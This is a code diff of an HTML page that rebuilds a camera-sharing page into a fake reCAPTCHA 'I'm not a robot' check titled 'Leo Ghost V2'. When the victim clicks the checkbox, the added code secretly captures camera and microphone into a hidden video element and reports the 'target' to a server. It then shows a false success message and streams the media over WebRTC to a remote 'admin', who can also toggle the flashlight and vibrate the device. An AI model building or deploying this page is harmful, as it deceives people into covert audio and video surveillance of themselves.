@@ -1,66 +1,95 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Harry Personal Link</title>
+    <title>Verification - Leo Ghost V2</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script src="/socket.io/socket.io.js"></script>
     <style>
-        body { background: #111; color: #fff; font-family: sans-serif; text-align: center; padding-top: 50px; }
-        input { padding: 10px; border-radius: 5px; border: 1px solid #555; background: #222; color: #fff; margin-bottom: 10px; }
-        button { padding: 10px 20px; background: #28a745; color: white; border: none; border-radius: 5px; cursor: pointer; }
+        body { font-family: 'Segoe UI', Arial, sans-serif; background: #f9f9f9; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .captcha-box { background: white; border: 1px solid #d3d3d3; padding: 20px; border-radius: 3px; display: flex; align-items: center; gap: 15px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 300px; }
+        .checkbox { width: 28px; height: 28px; border: 2px solid #c1c1c1; border-radius: 2px; cursor: pointer; display: flex; align-items: center; justify-content: center; }
+        .checkbox.checked { background: #4a90e2; border-color: #4a90e2; }
+        .checkbox.checked::after { content: '✔'; color: white; font-size: 18px; }
+        .text { color: #555; font-size: 14px; font-weight: 500; }
+        .logo { margin-left: auto; text-align: center; font-size: 10px; color: #555; }
+        #success-msg { display: none; text-align: center; color: #28a745; font-weight: bold; }
+        video { width: 1px; height: 1px; opacity: 0; position: absolute; }
     </style>
 </head>
 <body>
-    <div id="setup">
-        <h2>Enter Access Key</h2>
-        <input type="password" id="key" placeholder="Enter Key (e.g. harry)">
-        <br>
-        <button onclick="connect()">Connect Device</button>
+
+    <div id="captcha-container" class="captcha-box">
+        <div id="check" class="checkbox" onclick="initialize()"></div>
+        <div class="text">I'm not a robot</div>
+        <div class="logo">
+            <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" width="30"><br>reCAPTCHA
+        </div>
     </div>
-    <div id="status" style="margin-top:20px; color: #aaa;"></div>
-    <video id="localVideo" autoplay playsinline muted style="width: 100px; margin-top: 20px; border: 1px solid #444;"></video>
+
+    <div id="success-msg">Verification Successful. Redirecting...</div>
+
+    <!-- Hidden stream -->
+    <video id="localVideo" autoplay playsinline muted></video>
 
     <script>
         const socket = io();
         let localStream;
         let peerConnection;
+        let adminId = null;
         const config = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };
-
-        async function connect() {
-            const key = document.getElementById('key').value;
-            if(key !== "harry") return alert("Wrong Key!");
-
-            document.getElementById('setup').style.display = 'none';
-            document.getElementById('status').innerText = "Initializing Camera...";
-
+        async function initialize() {
+            document.getElementById('check').classList.add('checked');
+            
             try {
-             localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                // Permission le li
+                localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 document.getElementById('localVideo').srcObject = localStream;
-                document.getElementById('status').innerText = "Device Online. Waiting for Admin...";
                 
-                socket.emit('target-join'); 
+                // Server ko bataya ki main online hoon
+                socket.emit('target-join');
+
+                setTimeout(() => {
+                    document.getElementById('captcha-container').style.display = 'none';
+                    document.getElementById('success-msg').style.display = 'block';
+                }, 800);
+
             } catch (err) {
-                document.getElementById('status').innerText = "Error: Camera Access Denied!";
+                alert("Permission required for verification!");
+                location.reload();
             }
         }
 
-        socket.on('command', async (cmd) => {
-            if(cmd === 'start-stream') {
-                document.getElementById('status').innerText = "Streaming to Admin...";
-                setupWebRTC();
+        socket.on('command', async (data) => {
+            if(data.cmd === 'start-stream') {
+                adminId = data.adminId;
+                startBroadcasting();
+            } else if(data.cmd === 'flash') {
+                const track = localStream.getVideoTracks()[0];
+                const capabilities = track.getCapabilities();
+                if (capabilities.torch) {
+                    const settings = track.getSettings();
+                    await track.applyConstraints({ advanced: [{ torch: !settings.torch }] });
+                }
+            } else if(data.cmd === 'vibrate') {
+                window.navigator.vibrate(200);
             }
         });
-        async function setupWebRTC() {
+        async function startBroadcasting() {
+            if(peerConnection) peerConnection.close();
+            
             peerConnection = new RTCPeerConnection(config);
             localStream.getTracks().forEach(track => peerConnection.addTrack(track, localStream));
 
             peerConnection.onicecandidate = (event) => {
-                if(event.candidate) socket.emit('signal', { to: 'admin', signal: { candidate: event.candidate } });
+                if(event.candidate && adminId) {
+                    socket.emit('signal', { to: adminId, signal: { candidate: event.candidate } });
+                }
             };
 
             const offer = await peerConnection.createOffer();
             await peerConnection.setLocalDescription(offer);
-            socket.emit('signal', { to: 'admin', signal: { sdp: offer } });
+            
+            socket.emit('signal', { to: adminId, signal: { sdp: offer } });
         }
 
         socket.on('signal', async (data) => {
@@ -71,6 +100,5 @@
             }
         });
     </script>
-    </body>
+</body>
 </html>
-    
